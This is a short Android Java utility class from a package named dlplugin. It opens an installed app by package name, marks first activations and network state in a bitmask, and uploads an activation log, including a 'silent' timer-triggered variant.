package com.tiho.dlplugin.task.activate;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushMessageBean;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.log.bean.OperateItem;
import com.tiho.dlplugin.task.scheduleact.ScheduleActList;
import com.tiho.dlplugin.util.PackageUtil;

import android.content.Context;

public class ActivateUtil {

	private static int NETWORK_MASK = 0x10;
	private static int FIRST_MASK = 0x8;
	private static int BASE_ACT = 0x7;

	
	/**
	 * 
	 * @param context
	 * @param pack
	 *            包名
	 * @param hasNetwork
	 *            是否有网
	 * @param isFirst
	 *            是否是第一次激活
	 */
	public static void activate(Context context, long id, String pack, boolean fromSilent, boolean hasNetwork) {
		ActivatedRecord ar = ActivatedRecord.getInstance(context);
		
		int type = BASE_ACT;
		if (hasNetwork)
			type = type | NETWORK_MASK;

		// 是否首次激活
		if (!ar.activated(pack)){
			LogManager.LogShow(pack+"是首次激活");
			type = type | FIRST_MASK;
		}

		PackageUtil.openApp(context, pack);//打开应用
		ScheduleActList.getInstance(context).doneOne(pack);
		ar.addRecord(context, pack, System.currentTimeMillis());
		
		LogManager.LogShow("上传激活日志,pack="+pack + " , isSilent="+fromSilent +" , hasNetwork="+hasNetwork);
		
		if (fromSilent) {
			LogUploadManager.getInstance(context).addSilentOperateLog(PushMessageBean.TYPE_APP, OperateItem.OP_TYPE_ACTIVATED, pack, type, "APP_ACTIVATED_BY_TIMER");
		} else {
			LogUploadManager.getInstance(context).addOperateLog(id, PushMessageBean.TYPE_APP, OperateItem.OP_TYPE_ACTIVATED, pack, type, "APP_ACTIVATED_BY_TIMER");
		}

	}

}
